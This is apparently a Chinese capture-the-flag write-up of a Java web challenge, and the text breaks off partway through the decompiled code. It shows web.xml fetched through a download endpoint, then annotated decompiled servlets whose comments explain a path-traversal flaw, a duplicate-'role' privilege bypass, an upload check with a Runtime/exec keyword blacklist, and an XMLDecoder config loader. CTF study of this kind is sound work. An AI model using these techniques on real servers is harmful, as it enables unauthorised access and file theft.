<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161502654.png" alt="image-20220425161502654"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161512233.png" alt="image-20220425161512233"></p>
<p>存在upload和download test两个页面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161823123.png" alt="image-20220425161823123"></p>
<p>download会下载下来文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161903894.png" alt="image-20220425161903894"></p>
<p>upload只有管理员可以访问</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425162046486.png" alt="image-20220425162046486"></p>
<p>我们试着把guest改成admin也会变回guest</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161957956.png" alt="image-20220425161957956"></p>
<p>可得到web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>register<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.servlet.registerServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.servlet.loginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>home<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.servlet.homeServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.servlet.uploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>download<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.servlet.downloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>logout<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.servlet.logoutServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>loginFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.web.filter.LoginFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>loginFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/home/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/WEB-INF/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下载一下文件</p>
<p>&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;web&#x2F;servlet&#x2F;registerServlet.class</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425162659260.png" alt="image-20220425162659260"></p>
<p>registerServlet.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//继承HttpServlet类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">registerServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="comment">//本类的构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">registerServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//servlet类的doGet方法传入 前一个参数为请求 后一个参数是响应 抛出servletexception 和 ioexception</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;Not Allowed&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;WEB-INF/register.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//servlet类的doPOST方法</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//定义整形res</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="comment">//定义string类型role</span></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>(); <span class="comment">//new一个json对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//将post传入的data参数如果有空格就把空格替换为空,没有就返回源字符,接着进行替换将&#x27;替换为双引号</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;data&quot;</span>).replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">//表示正则表达式 匹配&quot;role&quot;:&quot;(.*?)&quot;</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;\&quot;role\&quot;:\&quot;(.*?)\&quot;&quot;</span>);</span><br><span class="line">		<span class="comment">//对最后一个匹配的进行强制替换.但是那里用的是for循环，role得到的是最后依次匹配到的，所以可以写2个不一样的role，把最后依次匹配到的替换掉就可以了</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(<span class="keyword">var</span>); matcher.find(); role = matcher.group()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Person person;</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isNullOrEmpty(role)) &#123;<span class="comment">//如果role不是空</span></span><br><span class="line">            <span class="keyword">var</span> = <span class="keyword">var</span>.replace(role, <span class="string">&quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;</span>);<span class="comment">//就将其替换为&quot;role&quot;:&quot;guest&quot;</span></span><br><span class="line">            person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);<span class="comment">//安装person.class类的方法转换成json在强转成person</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            person = (Person)gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">            person.setRole(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(person);<span class="comment">//打印person</span></span><br><span class="line">        <span class="keyword">if</span> (person.getUsername() == <span class="literal">null</span> || person.getPassword() == <span class="literal">null</span>) &#123;<span class="comment">//</span></span><br><span class="line">            resp.sendError(<span class="number">500</span>, <span class="string">&quot;用户名或密码不能为空!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        person.setPic(<span class="string">&quot;/static/cat.gif&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = baseDao.getConnection();<span class="comment">//连接数据库</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            var17.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql_query</span> <span class="operator">=</span> <span class="string">&quot;select * from ctf where username=?&quot;</span>;</span><br><span class="line">            Object[] params1 = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;person.getUsername()&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> baseDao.execute(connection, sql_query, params1);<span class="comment">//执行sql语句查询username=param1</span></span><br><span class="line">                <span class="keyword">if</span> (rs.next()) &#123;<span class="comment">//如果rs有俩就打印存在</span></span><br><span class="line">                    System.out.println(rs.next());</span><br><span class="line">                    resp.sendError(<span class="number">500</span>, <span class="string">&quot;user already exists!&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//将用户名密码写入</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into ctf (username,password,role,pic) values (?,?,?,?)&quot;</span>;</span><br><span class="line">                    Object[] params2 = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;person.getUsername(), person.getPassword(), person.getRole(), person.getPic()&#125;;</span><br><span class="line">                    res = baseDao.Update(connection, sql, params2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">                var16.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            baseDao.closeResource(connection, (ResultSet)<span class="literal">null</span>, (PreparedStatement)<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;register success!&quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//输出注册成功</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>downloadServlet.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">downloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">downloadServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//得到file参数</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            System.out.println(file);<span class="comment">//打印CATALINA_HOME的位置连接后面的未对file参数进行过滤</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/upload/&quot;</span> + file;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);<span class="comment">//将file读到流中</span></span><br><span class="line">            resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + file);</span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> resp.getOutputStream();</span><br><span class="line">            <span class="type">byte</span>[] bt = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> length;</span><br><span class="line">            <span class="keyword">while</span>((length = fis.read(bt)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(bt, <span class="number">0</span>, length);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            resp.sendError(<span class="number">500</span>, <span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>uploadServlet.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@MultipartConfig</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">uploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">uploadServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">user</span> <span class="operator">=</span> (Person)req.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        System.out.println(user.getRole());</span><br><span class="line">        <span class="keyword">if</span> (!admin.equals(user.getRole())) &#123;<span class="comment">//需要role是admin</span></span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;admin only&#x27;);history.back(-1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/error.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            List&lt;String&gt; fileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();<span class="comment">//定义filename</span></span><br><span class="line">            tools.findFileList(<span class="keyword">new</span> <span class="title class_">File</span>(System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/upload/&quot;</span>), fileNames);</span><br><span class="line">            req.setAttribute(<span class="string">&quot;files&quot;</span>, fileNames);</span><br><span class="line">            System.out.println(fileNames);</span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(req)) &#123;</span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/error.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">        factory.setSizeThreshold(<span class="number">3145728</span>);</span><br><span class="line">        factory.setRepository(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)));</span><br><span class="line">        <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line">        upload.setFileSizeMax(<span class="number">41943040L</span>);</span><br><span class="line">        upload.setSizeMax(<span class="number">52428800L</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;FileItem&gt; formItems = upload.parseRequest(req);</span><br><span class="line">            <span class="keyword">if</span> (formItems != <span class="literal">null</span> &amp;&amp; formItems.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">Iterator</span> <span class="variable">var7</span> <span class="operator">=</span> formItems.iterator();</span><br><span class="line"></span><br><span class="line">                label34:</span><br><span class="line">                <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                    FileItem item;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!var7.hasNext()) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label34;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        item = (FileItem)var7.next();</span><br><span class="line">                    &#125; <span class="keyword">while</span>(item.isFormField());</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> item.getName();</span><br><span class="line">                    <span class="comment">//截取最后一个点后面的</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">ext</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>)).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fileName.replace(ext, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    <span class="comment">//检查后缀</span></span><br><span class="line">                    <span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">                        req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">                        req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> uploadPath + File.separator + name + ext;</span><br><span class="line">                    <span class="type">File</span> <span class="variable">storeFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">                    item.write(storeFile);</span><br><span class="line">                    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//检查</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkExt</span><span class="params">(String ext)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        String[] extWhiteList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;bak&quot;</span>, <span class="string">&quot;properties&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;xhtml&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;gz&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;txt&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span> (!Arrays.asList(extWhiteList).contains(ext.toLowerCase())) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkContent</span><span class="params">(InputStream item)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(item);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(input);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((line = bf.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            sb.append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        String[] blackList = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;ProcessBuilder&quot;</span>, <span class="string">&quot;jdbc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; blackList.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (content.contains(blackList[i])) &#123;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>baseDao.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">baseDao</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection connection;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">baseDao</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这里对db.xml进行了解码操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getConfig</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/db/db.xml&quot;</span>))).readObject();</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> HashMap) &#123;</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> (HashMap)obj;</span><br><span class="line">            <span class="keyword">if</span> (map != <span class="literal">null</span> &amp;&amp; map.get(<span class="string">&quot;url&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                driver = (String)map.get(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">                url = (String)map.get(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">                username = (String)map.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                password = (String)map.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        getConfig();</span><br><span class="line">        <span class="keyword">if</span> (connection == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(driver);</span><br><span class="line">                connection = DriverManager.getConnection(url, username, password);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException var1) &#123;</span><br><span class="line">                var1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> connection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ResultSet <span class="title function_">execute</span><span class="params">(Connection connection, String sql, Object[] params)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">PreparedStatement</span> 